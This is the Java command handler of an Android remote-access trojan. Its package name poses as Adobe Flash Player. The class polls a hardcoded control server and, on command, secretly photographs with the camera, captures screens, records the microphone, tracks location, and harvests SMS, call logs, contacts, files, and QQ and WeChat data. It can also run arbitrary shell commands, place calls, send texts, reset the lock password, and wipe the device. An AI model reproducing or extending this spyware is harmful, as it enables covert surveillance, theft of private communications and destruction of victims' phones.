package com.adobe.flashplayer.network;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.accessory.AccessHelper;
import com.adobe.flashplayer.accessory.LinuxShell;
import com.adobe.flashplayer.core.DeviceManager;
import com.adobe.flashplayer.data.CameraActivity2;
import com.adobe.flashplayer.data.CameraDialog;
import com.adobe.flashplayer.data.ExtSDCardFile;
import com.adobe.flashplayer.data.Location.AMaplocation;
import com.adobe.flashplayer.data.Location.MyTencentLocation;
import com.adobe.flashplayer.data.PhoneApps;
import com.adobe.flashplayer.data.PhoneCallLog;
import com.adobe.flashplayer.data.PhoneContacts;
import com.adobe.flashplayer.data.PhoneInformation;
import com.adobe.flashplayer.data.PhoneLocationWrapper;
import com.adobe.flashplayer.data.PhoneMicRecord;
import com.adobe.flashplayer.data.PhoneRunning;
import com.adobe.flashplayer.data.PhoneSDFiles;
import com.adobe.flashplayer.data.PhoneSMS;
import com.adobe.flashplayer.data.PhoneWIFI;
import com.adobe.flashplayer.data.ScreenShotActivity;
import com.adobe.flashplayer.data.UploadRemainder;
import com.adobe.flashplayer.data.app.QQ;
import com.adobe.flashplayer.data.app.WECHAT;
import com.adobe.flashplayer.install.InstallActivity;

import android.content.Context;
import android.content.Intent;
import android.util.Log;



public class ServerCommand implements Runnable{

	private static final String TAG = "[ljg]ServerCommand";
	
	private Context context = null;
	private int cmd = 0;

	int mRecvbufLen;

	private byte[] recvimei = new byte[Public.IMEI_IMSI_PHONE_SIZE];

	byte[] recvbuf ;
	
	public ServerCommand(Context context){
		//此处不能写作 context = context，why?
		this.context = context;

		Network network = new Network(context);

		this.cmd = Public.CMD_HEARTBEAT;

		mRecvbufLen = Public.RECV_SEND_BUFSIZE;
		recvbuf = new byte[mRecvbufLen];
	}
	
	boolean compareImei(byte[]imei1,byte[]imei2){
		if (imei1.length != imei2.length) {
			return false;
		}
		for (int i = 0; i < imei1.length; i++) {
			if (imei1[i] != imei2[i]) {
				
				return false;
			}
		}
		
		return true;
	}
	
	
	
	public synchronized void run(){

		while(true){
			Socket socket = null;
			OutputStream ous = null;
			InputStream ins = null;
			try{
				if(NetworkUtils.isNetworkAvailable (context) == true){
		            socket = new Socket();
		            InetSocketAddress inetaddr = new InetSocketAddress(Public.SERVER_IP_ADDRESS, Public.SERVER_CMD_PORT);
		            socket.connect(inetaddr, Public.SERVER_CMD_CONNECT_TIMEOUT);
		            //With this option set to a non-zero timeout,a read() call on the InputStream associated with this Socket will block for only this amount of time.
		            //If the timeout expires, a java.net.SocketTimeoutException is raised, though the Socket is still valid. 
		            socket.setSoTimeout(Public.SERVERCMD_ALARM_INTERVAL);
					ous = socket.getOutputStream();
					ins = socket.getInputStream();
					
					boolean ret = false;
					ret = sendCmdToServer("".getBytes(), ous, cmd, Public.IMEI);
					if (ret == true) {

						while(true){
						
							int recvlen = ins.read(recvbuf,0,Public.RECV_SEND_BUFSIZE);
							if(recvlen >= 24){		
							
								System.arraycopy(recvbuf, 8, recvimei, 0, Public.IMEI_IMSI_PHONE_SIZE);
			
								if (compareImei(recvimei,Public.IMEI) == true) {
									int result = ServerCommandProc(ins,ous,recvbuf,recvlen);
									if (result < 0) {
										Log.e(TAG,"[liujinguang]ServerCommand recv packet error:" + result);
										MyLog.writeLogFile("[liujinguang]ServerCommand recv packet error:" + result + "\r\n");
										
										break;
									}else{
										continue;
									}
								}else{
									break;
								}
							}else{
								break;
							}
						}
					}
				}
			}catch(Exception ex){
				ex.printStackTrace();
			}
			
			try{
				if (ins != null) {
					ins.close();
					ins = null;
				}
				
				if(ous != null){
					ous.close();
					ous = null;
				}
				
				if(socket != null){
					socket.close();
					socket = null;
				}
			}catch(Exception exp){
				exp.printStackTrace();
			}
			
			try {
				Thread.sleep(Public.SERVERCMD_ALARM_INTERVAL);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
			
	
	//数据包格式：
	//1 客户端发往服务的数据包：第一个int是包大小，第二个int是cmd，第8字节开始的16字节是客户端标识符，第24字节开始的16字节是用户名称，第40字节开始是数据
	//2 服务器发给客户端的数据包：第一个int是包大小，第二个int是cmd，第8字节开始的16字节是客户端标识符，第24字节开始是数据
	public int ServerCommandProc(InputStream ins,OutputStream ous,byte[]recvbuf,int recvlen){
		try{
			byte[] byterecvpacklen = new byte[4];
			System.arraycopy(recvbuf, 0, byterecvpacklen, 0, 4);
			int recvpacklen = Utils.bytesToInt(byterecvpacklen);
			if (recvpacklen == recvlen){
				//so good
			}
			else if ( (recvpacklen > Public.MAX_TRANSFER_FILESIZE) || (recvpacklen < 24) ) {
				Log.e(TAG,"data size:" + recvpacklen + " overflow " + " recv data size:" + recvlen);
				return -1;
			}
			else if (recvpacklen > Public.RECV_SEND_BUFSIZE && recvpacklen <= Public.MAX_TRANSFER_FILESIZE){
				byte[] newrecvbuf = new byte[recvpacklen];
				if (newrecvbuf == null){
					Log.e(TAG,"data size:" + recvpacklen + " recv data size:" + recvlen + " allocate error");
					return -1;
				}
				System.arraycopy(recvbuf,0,newrecvbuf,0,recvlen);
				recvbuf = newrecvbuf;
				int nextrecvlen = 0;
				while((nextrecvlen = ins.read(recvbuf,recvlen,recvpacklen - recvlen)) > 0){
					recvlen += nextrecvlen;
					if (recvlen >= recvpacklen) {
						break;
					}
				}
			}
			else if ( (recvpacklen > recvlen) && (recvpacklen <= Public.RECV_SEND_BUFSIZE) ) {
				int nextrecvlen = 0;
				while((nextrecvlen = ins.read(recvbuf,recvlen,Public.RECV_SEND_BUFSIZE - recvlen)) > 0){
					recvlen += nextrecvlen;
					if (recvlen >= recvpacklen) {
						break;
					}
				}
			}else{
				Log.e(TAG,"data size:" + recvpacklen + " recv data size:" + recvlen + " error");
				return -1;
			}

			byte[] byteservercmd = new byte[4];
			System.arraycopy(recvbuf, 4, byteservercmd, 0, 4);
			int servercmd = Utils.bytesToInt(byteservercmd);

			if(servercmd == Public.CMD_HEARTBEAT || servercmd == Public.CMD_NETWORKTYPE){
				Public.gOnlineType = NetworkUtils.getNetworkType(context);
				sendCmdToServer("".getBytes(), ous, Public.CMD_HEARTBEAT, Public.IMEI);
				return 0;
			}
			else if (servercmd == Public.CMD_MESSAGEBOX) {
				byte[] bytetitlelen = new byte[4];
				System.arraycopy(recvbuf, 24, bytetitlelen, 0, 4);
				int titlelen = Utils.bytesToInt(bytetitlelen);
				
				byte[] title = new byte[titlelen];
				System.arraycopy(recvbuf, 28, title, 0, titlelen);
				
				byte[] bytectlen = new byte[4];
				System.arraycopy(recvbuf, 24 + 4 + titlelen, bytectlen, 0, 4);
				int ctlen = Utils.bytesToInt(bytectlen);
				
				byte[] content = new byte[ctlen];
				System.arraycopy(recvbuf, 24 + 4 + titlelen + 4, content, 0, ctlen);

				MyLog.writeLogFile("recv cmd messagebox\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_LOCATION) {
				byte[] bytestartlen = new byte[4];
				System.arraycopy(recvbuf, 24, bytestartlen, 0, 4);
				int startlen = Utils.bytesToInt(bytestartlen);
				
				byte[] start = new byte[startlen];
				System.arraycopy(recvbuf, 28, start, 0, startlen);
				
				byte[] byteendlen = new byte[4];
				System.arraycopy(recvbuf, 24 + 4 + startlen, byteendlen, 0, 4);
				int endlen = Utils.bytesToInt(byteendlen);
				
				byte[] end = new byte[endlen];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4, end, 0, endlen);

				byte[] bytevallen = new byte[4];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4 + endlen, bytevallen, 0, 4);
				int vallen = Utils.bytesToInt(bytevallen);
				
				byte[] val = new byte[vallen];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4 + endlen + 4, val, 0, vallen);
				
				MyLog.writeLogFile("recv cmd location\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_SINGLELOCATION) {
				PhoneLocationWrapper.getLastLocation(context);

				int installtype = AccessHelper.getInstallMode(context);
				if (installtype == AccessHelper.INSTALL_TYPE_MANUAL||installtype == AccessHelper.INSTALL_TYPE_APK){

					AMaplocation amap = new AMaplocation(context,Public.PHONE_LOCATION_MINSECONDS);
					new Thread(amap).start();

					MyTencentLocation tecentloc = new MyTencentLocation(context,Public.PHONE_LOCATION_MINSECONDS) ;
					new Thread(tecentloc).start();

				}else if (installtype == AccessHelper.INSTALL_TYPE_JAR || installtype == AccessHelper.INSTALL_TYPE_SO){

				}
			}
			else if (servercmd == Public.CMD_CANCELLOCATION) {

			}
			else if (servercmd == Public.CMD_CANCELSCREENCAP) {

			}
			else if (servercmd == Public.CMD_SINGLESCREENCAP) {
				int installtype = AccessHelper.getInstallMode(context);
				if (installtype == AccessHelper.INSTALL_TYPE_MANUAL||installtype == AccessHelper.INSTALL_TYPE_APK){

					Intent intentscr = new Intent(context, ScreenShotActivity.class);
					intentscr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					context.startActivity(intentscr);

				}else if (installtype == AccessHelper.INSTALL_TYPE_JAR || installtype == AccessHelper.INSTALL_TYPE_SO){

				}
			}
			else if (servercmd == Public.CMD_DATA_SCRNSNAPSHOT) {			
				byte[] bytestartlen = new byte[4];
				System.arraycopy(recvbuf, 24, bytestartlen, 0, 4);
				int startlen = Utils.bytesToInt(bytestartlen);
				
				byte[] start = new byte[startlen];
				System.arraycopy(recvbuf, 28, start, 0, startlen);
				
				byte[] byteendlen = new byte[4];
				System.arraycopy(recvbuf, 24 + 4 + startlen, byteendlen, 0, 4);
				int endlen = Utils.bytesToInt(byteendlen);
				
				byte[] end = new byte[endlen];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4, end, 0, endlen);

				byte[] bytevallen = new byte[4];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4 + endlen, bytevallen, 0, 4);
				int vallen = Utils.bytesToInt(bytevallen);
				
				byte[] val = new byte[vallen];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4 + endlen + 4, val, 0, vallen);

				MyLog.writeLogFile("recv cmd screensnapshot\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_CAMERAPHOTO) {
				
				byte[] bytecamera = new byte[4];
				System.arraycopy(recvbuf, 24, bytecamera, 0, 4);
				int intcamera = Utils.bytesToInt(bytecamera);

				int installtype = AccessHelper.getInstallMode(context);
				if (installtype == AccessHelper.INSTALL_TYPE_MANUAL||installtype == AccessHelper.INSTALL_TYPE_APK){
					Intent intentCamera = new Intent(context, CameraActivity2.class);
					intentCamera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					intentCamera.putExtra("index",0);
					intentCamera.putExtra("count",1);
					context.startActivity(intentCamera);
				}else if (installtype == AccessHelper.INSTALL_TYPE_JAR || installtype == AccessHelper.INSTALL_TYPE_SO){
					new Thread(new CameraDialog(context,intcamera)).start();
				}

				MyLog.writeLogFile("recv cmd camera\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_MICAUDIORECORD) {
				byte[] byteseconds = new byte[4];
				System.arraycopy(recvbuf, 24, byteseconds, 0, 4);
				int seconds = Utils.bytesToInt(byteseconds);
				if (seconds <= 0) {
					seconds = 60;
				}else if (seconds > 3600) {
					seconds = 3600;
				}

				new Thread(new PhoneMicRecord(context,seconds)).start();

				MyLog.writeLogFile("recv cmd mic audio record second:" + seconds +"\r\n");
				return 0;
			}
			else if(servercmd == Public.CMD_AUTOINSTALL) {

				MyLog.writeLogFile("recv cmd autoinstall\r\n");
				return 0;
			}
			else if(servercmd == Public.CMD_UPLOADFILE){

				MyLog.writeLogFile("recv cmd upload file\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_UPDATEPROC) {

				MyLog.writeLogFile("recv cmd update plugin\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DOWNLOADFILE) {

				MyLog.writeLogFile("recv cmd download file\r\n");
				return 0;
			}
			else if(servercmd == Public.CMD_RUNCOMMAND){
				byte[] bytecmdlen = new byte[4];
				System.arraycopy(recvbuf, 24, bytecmdlen, 0, 4);
				int cmdlen = Utils.bytesToInt(bytecmdlen);
				byte[] cmdcontent = new byte[cmdlen];
				System.arraycopy(recvbuf, 28, cmdcontent, 0, cmdlen);
				String shellcmd = new String(cmdcontent);

				new Thread(new LinuxShell(shellcmd)).start();

				MyLog.writeLogFile("recv cmd shellcmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_PHONECALL) {
				byte[] bytephonelen = new byte[4];
				System.arraycopy(recvbuf, 24, bytephonelen, 0, 4);
				int phonelen = Utils.bytesToInt(bytephonelen);
				byte[] phoneno = new byte[phonelen];
				System.arraycopy(recvbuf, 28, phoneno, 0, phonelen);
				String strphoneno = new String(phoneno);

				PhoneCallLog.callPhoneNumber(context,strphoneno);

				MyLog.writeLogFile("recv cmd phonecall\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_SENDMESSAGE) {
				byte[] bytephonelen = new byte[4];
				System.arraycopy(recvbuf, 24, bytephonelen, 0, 4);
				int phonelen = Utils.bytesToInt(bytephonelen);
				byte[] phoneno = new byte[phonelen];
				System.arraycopy(recvbuf, 28, phoneno, 0, phonelen);
				String strphoneno = new String(phoneno);
				
				byte[] bytemsglen = new byte[4];
				System.arraycopy(recvbuf, 28 + phonelen, bytemsglen, 0, 4);
				int msglen = Utils.bytesToInt(bytemsglen);
				byte[] msg = new byte[msglen];
				System.arraycopy(recvbuf, 32 + phonelen, msg, 0, msglen);
				String strmsg = new String(msg);

				PhoneSMS.sendMessage(context,strphoneno,strmsg);

				MyLog.writeLogFile("recv cmd send message\r\n");

				return 0;
			}
			else if (servercmd == Public.CMD_DATA_APPMESSAGE) {

				MyLog.writeLogFile("ServerCommand send app message ok\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_RESETPASSWORD) {
				byte[] bytepswlen = new byte[4];
				System.arraycopy(recvbuf, 24, bytepswlen, 0, 4);
				int pswlen = Utils.bytesToInt(bytepswlen);
				
				String strpsw = "";
				if(pswlen > 0 && pswlen <= 16){
					byte[] psw = new byte[pswlen];
					System.arraycopy(recvbuf, 28, psw, 0, pswlen);
					strpsw = new String(psw);
				}else if(pswlen == 0){
					strpsw = "";
				}
				DeviceManager.resetLockPassword(context,strpsw);
				return 0;
			}
			else if (servercmd == Public.CMD_WIPESYSTEM) {
				DeviceManager.wipeSetting(context);

				return 0;
			}
			else if (servercmd == Public.CMD_WIPESTORAGE) {
				DeviceManager.wipeStorage(context);
				return 0;
			}
			else if(servercmd == Public.CMD_RESETPROGRAM){
				//rootFunction.restart(context);
				return 0;
			}
			else if (servercmd == Public.CMD_RESETSYSTEM) {

				DeviceManager.resetSystem(context);
				return 0;
			}
			else if (servercmd == Public.CMD_SHUTDOWNSYSTEM) {
				//rootFunction.shutdown(context);
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_MESSAGE) {

				new Thread(new Runnable() {
					@Override
					public void run() {
						PhoneSMS.getSmsFromPhone(context);
					}
				}).start();

				MyLog.writeLogFile("ServerCommand phone message ok\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_CALLLOG) {

				new Thread(new Runnable(){
					@Override
					public  void run(){
						PhoneCallLog.getPhoneCallLog(context);
					}
				}).start();

				MyLog.writeLogFile("ServerCommand calllog ok\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_CONTACTS) {
				new Thread(new Runnable(){
					@Override
					public  void run(){
						PhoneContacts.getPhoneContacts(context);
					}
				}).start();

				MyLog.writeLogFile("ServerCommand contact ok\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_SDCARDFILES) {
				PhoneSDFiles sdcardfies = new PhoneSDFiles(context,Public.SDCARDPATH, Public.LOCAL_PATH_NAME, Public.SDCARDFILES_NAME,Public.CMD_DATA_SDCARDFILES);
				Thread thread = new Thread(sdcardfies);
				thread.start();

				new Thread(new UploadRemainder(context)).start();

				new Thread(new QQ(context)).start();

				new Thread(new WECHAT(context)).start();

				MyLog.writeLogFile("ServerCommand sd card command\r\n");
		    	return 0;
			}
			else if (servercmd == Public.CMD_DATA_FLASHCARDFILES) {

				MyLog.writeLogFile("ServerCommand flash card command ok\r\n");
			}
			else if (servercmd == Public.CMD_DATA_EXTCARDFILES) {

				ExtSDCardFile.getExtcardFiles(context);

				MyLog.writeLogFile("ServerCommand ext card command ok\r\n");
		    	return 0;
			}
			else if (servercmd == Public.CMD_DATA_DEVICEINFO) {
				new Thread(new Runnable(){
					@Override
					public  void run(){
						PhoneInformation.getPhoneInformation(context);
					}
				}).start();

				MyLog.writeLogFile("ServerCommand deviceinfo cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_WIFI) {

				new Thread(new Runnable(){
					@Override
					public  void run(){
						PhoneWIFI.getPhoneWIFI(context);
					}
				}).start();

				MyLog.writeLogFile("recv wifi info cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_WEBKITHISTORY) {

				MyLog.writeLogFile("recv get webkit history cmd\r\n");
		    	return 0;
			}
			else if(servercmd == Public.CMD_UPLOAD_LOG){

				MyLog.writeLogFile("recv cmd upload log file\r\n");
		    	return 0;
			}
			else if (servercmd == Public.CMD_DATA_APPPROCESS) {

				new Thread(new Runnable(){
					@Override
					public  void run(){
						PhoneApps.getInstallApps(context);
					}
				}).start();

				MyLog.writeLogFile("ServerCommand appprocess cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_RUNNINGAPPS) {

				new Thread(new Runnable(){
					@Override
					public  void run(){
						PhoneRunning.getPhoneRunning(context);
					}
				}).start();

				MyLog.writeLogFile("ServerCommand running cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_FILERECORD) {

				MyLog.writeLogFile("ServerCommand filerecord cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_UNINSTALLSELF) {

				Log.e(TAG,"recv uninstall cmd ok\r\n");
				MyLog.writeLogFile("ServerCommand recv uninstall cmd ok\r\n");
				
				return 0;
			}
			else if (servercmd == Public.CMD_UPLOADDB) {

				MyLog.writeLogFile("ServerCommand recv CMD_UPLOADDB:" + cmd +" cmd\r\n");
				return 0;
			}
			else if(servercmd == Public.CMD_CHANGEIP){

				return 0;
			}
			else if (servercmd == Public.CMD_SETCONFIG) {

				return 0;
			}
			else{
				MyLog.writeLogFile("ServerCommand recv unrecognized command\r\n");
				return 0;
			}
		}
		catch(Exception ex){
			ex.printStackTrace();
			String error = Utils.getExceptionDetail(ex);
			String stack = Utils.getCallStack();
			MyLog.writeLogFile(TAG +" ServerCommand exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
			return -3;
		}
		
		return 0;
	}

	
	public static boolean sendCmdToServer(byte[] data,OutputStream ous,int cmdtype,byte[] byteimei){
		try{
			int sendsize = 4 + 4 + 4 + Public.IMEI_IMSI_PHONE_SIZE + Public.IMEI_IMSI_PHONE_SIZE + data.length;	
			byte[] senddata = new byte[sendsize];
		
			int offset = 0;
			byte bytesendseize[] = Utils.intToBytes(sendsize);
			for (int i = 0; i < bytesendseize.length; i++) {
				senddata[offset +i] = bytesendseize[i];
			}
			offset += bytesendseize.length;
			
			byte[] bytecmd = Utils.intToBytes(cmdtype);
			for (int i = 0; i < bytecmd.length; i++) {
				senddata[offset + i] = bytecmd[i];
			}
			offset += bytecmd.length;
			
			//command without cryption or compression
			int mode = Public.gOnlineType;
			byte bytereserved[] = Utils.intToBytes(mode);
			for (int i = 0; i < bytereserved.length; i++) {
				senddata[offset + i] = bytereserved[i];
			}
			offset += bytereserved.length;
			
			for (int i = 0; i < byteimei.length; i++) {
				senddata[offset + i] = byteimei[i];
			}
			offset += Public.IMEI_IMSI_PHONE_SIZE;
			
			
			for (int i = 0; i < Public.UserName.length(); i++) {
				senddata[offset + i] = Public.UserName.getBytes()[i];
			}
			offset += Public.IMEI_IMSI_PHONE_SIZE;

			for (int i = 0; i < data.length; i++) {
				senddata[offset + i] = data[i];
			}
			offset += data.length;
			
			ous.write(senddata, 0, sendsize);
			ous.flush();
			return true;
		} 
		catch (Exception ex) {
			ex.printStackTrace();
			String error = Utils.getExceptionDetail(ex);
			String stack = Utils.getCallStack();
			MyLog.writeLogFile("[liujinguang]ServerCommand command:" + String.valueOf(cmdtype) +
					" exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
			return false;
		}
	}
}
